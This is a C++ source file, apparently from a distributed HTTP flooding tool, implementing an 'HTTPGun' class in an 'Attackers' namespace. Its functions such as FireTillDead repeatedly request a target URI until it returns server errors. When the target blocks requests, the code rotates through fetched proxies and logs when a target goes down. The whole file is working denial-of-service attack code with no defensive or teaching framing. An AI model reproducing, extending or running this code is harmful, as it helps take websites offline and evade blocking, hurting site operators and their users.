#include <iterator>

#include "spdlog/spdlog.h"

#include "http_gun.h"

#include "wrappers/http_wrapper.h"
#include "api_interface.h"
#include "target.hpp"
#include "utils.h"
#include "config.h"
#include "proxy_checker.h"

using namespace Attackers;

bool HTTPGun::LoadProxies()
{
	NetUtil::DefaultHostProxyChecker proxyChecker;

	size_t proxyLoadTries{0};
	while(!m_currentTask.ShouldStop())
	{
		if(const auto possibleProxies{m_proxyGetter->GetProxies()})
		{
			auto workingProxies{
				proxyChecker.CheckProxies(*possibleProxies,
					m_currentTask)};
			if(!workingProxies.empty())
			{
				std::move(begin(workingProxies), end(workingProxies), 
					std::back_inserter(m_availableProxies));
				return true;
			}
			else
			{
				++proxyLoadTries;
			}
		}
		else
		{
			++proxyLoadTries;
			continue;
		}
	}
	if(proxyLoadTries == ProxyConfig::PROXY_LOAD_TRIES)
	{
		SPDLOG_WARN("Max proxy fetch tries reached, aborting");
	}
	return false;
}

std::size_t HTTPGun::FireTillDead(const URI &targetToKill) noexcept
{
	std::size_t hits{0};

	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
	if(AttackWithNoProxy(targetToKill, hits))
	{
		return hits;
	}

	SPDLOG_INFO("Attacking {} with proxy", targetToKill);
	AttackWithProxy(targetToKill, hits);

	return hits;
}

HTTPGun::TargetStatus HTTPGun::FireGun()
{
	const auto respCode{m_wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
	if(!respCode)
	{
		return TargetStatus::ErrorWhileRequesting;
	}
	else if(*respCode >= 400 && *respCode < 500)
	{
		return TargetStatus::TargetBlocking;
	}
	else if(*respCode >= 500)
	{
		return TargetStatus::TargetDown;
	}
	else
	{
		return TargetStatus::TargetAlive;
	}
}

bool HTTPGun::AttackWithNoProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
{
	size_t errorsCount{0};

	m_headers = HTTP::BASE_HEADERS;
	m_wrapper.SetTarget(targetToKill.GetFullURI());

	while(!m_currentTask.ShouldStop())
	{
		SetupNonProxyHeaders();
		switch(FireGun())
		{
			case TargetStatus::TargetBlocking:
			{
				SPDLOG_WARN("Target {} is blocking non proxy requests, leaving", targetToKill);
				return false;
			}
			case TargetStatus::TargetDown:
			{
				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill);
				return true;
			}
			case TargetStatus::TargetAlive:
			{
				++hitsCount;
				break;
			}
			case TargetStatus::ErrorWhileRequesting:
			{
				if(++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
				{
					SPDLOG_WARN("Too many errors emited on no proxy attack, leaving");
					return true;
				}
			}
		}
	}

	return false;
}

void HTTPGun::AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
{
	if(!LoadProxies())
	{
		SPDLOG_WARN("Failed to load any working proxies");
		return;
	}

	m_wrapper.SetTarget(targetToKill.GetFullURI());
	m_headers = HTTP::BASE_HEADERS;

	std::size_t errorsCount{0};

	HTTP::Proxy currentProxy;
	while(!m_currentTask.ShouldStop())
	{
		if(!m_availableProxies.empty())
		{
			currentProxy = std::move(m_availableProxies.front());
			m_availableProxies.pop_front();
		}
		else
		{
			SPDLOG_INFO("Proxy list exhausted, leaving");
			return;
		}

		// Attacking
		std::size_t currentProxyAttackCounter{0}; 
		m_wrapper.SetProxy(currentProxy);
		while(currentProxyAttackCounter++ < ProxyConfig::MAX_PROXY_ATTACKS &&
			!m_currentTask.ShouldStop())
		{
			SetupProxyHeaders(currentProxy.first);

			switch(FireGun())
			{
				case TargetStatus::TargetBlocking:
				{
					SPDLOG_INFO("Target {} is blocking current proxy, trying other", targetToKill);
					currentProxyAttackCounter = ProxyConfig::MAX_PROXY_ATTACKS;
					break;
				}
				case TargetStatus::TargetDown:
				{
					SPDLOG_INFO("Target: {} is down, looking for others", targetToKill);
					return;
				}
				case TargetStatus::TargetAlive:
				{
					++currentProxyAttackCounter;
					++hitsCount;
					break;
				}
				case TargetStatus::ErrorWhileRequesting:
				{
					if(++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
					{
						SPDLOG_INFO("Too many errors emited on proxy attack, trying other");
						return;
					}
				}
			}
		}
		SPDLOG_WARN("Current proxy exhausted, looking for other");
	}
}
